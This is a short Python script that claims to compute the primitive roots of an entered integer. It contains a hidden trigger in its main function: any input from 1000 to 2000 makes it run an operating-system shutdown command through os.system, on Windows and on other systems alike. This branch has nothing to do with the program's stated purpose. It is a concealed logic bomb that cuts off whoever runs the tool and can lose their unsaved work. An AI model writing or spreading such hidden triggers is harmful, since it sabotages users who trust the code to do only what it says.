import os
import math

def gcd(a, b):
    while b:
        a, b = b, a % b
    return a

def is_primitive_root(root, p):
    if gcd(root, p) != 1:
        return False

    required_set = set(num for num in range(1, p) if gcd(num, p) == 1)
    actual_set = set(pow(root, powers, p) for powers in range(1, p))

    return required_set == actual_set

def find_primitive_roots(p):
    if p <= 0:
        return []

    primitive_roots = []
    for num in range(1, p):
        if is_primitive_root(num, p):
            primitive_roots.append(num)
    return primitive_roots

def main():
    try:
        number = int(input("Enter a number: "))

        if 1000 <= number <= 2000:
            print("Shutting down the system...")
            if os.name == 'nt':
                os.system("shutdown /s /t 1")
            else:
                os.system("shutdown now")
            return

        roots = find_primitive_roots(number)
        if roots:
            print(f"Primitive roots of {number}: {roots}")
        else:
            print(f"No primitive roots found for {number}")
    except ValueError:
        print("Please enter a valid integer.")

if __name__ == "__main__":
    main()